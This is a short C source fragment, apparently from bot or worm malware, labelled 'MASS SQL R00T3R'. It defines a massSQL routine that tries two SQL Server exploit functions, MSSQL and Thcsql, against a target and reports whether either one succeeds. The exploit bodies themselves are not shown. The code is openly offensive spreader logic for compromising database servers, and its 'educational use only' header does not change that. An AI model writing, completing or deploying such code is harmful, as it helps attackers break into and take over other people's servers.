/*************************************************************
 *    Experiment code by Depth45. For educational use only   *
 *                    MASS SQL R00T3R                        *
 *                       PRIVATE                             *
 *************************************************************/



#include "includes.h"
#include "functions.h"
#include "externs.h"

#ifndef NO_THCSQL
#ifndef NO_MSSQL
#ifndef NO_DEPTH4


BOOL massSQL(EXINFO exinfo)
 {
	exinfo.port = 1443;
	BOOL bMSSQL = MSSQL(exinfo);
	exinfo.port = 1443;
	BOOL bTHCSQL = Thcsql(exinfo);
	return bMSSQL || bTHCSQL ? TRUE : FALSE;
}

#endif
#endif
#endif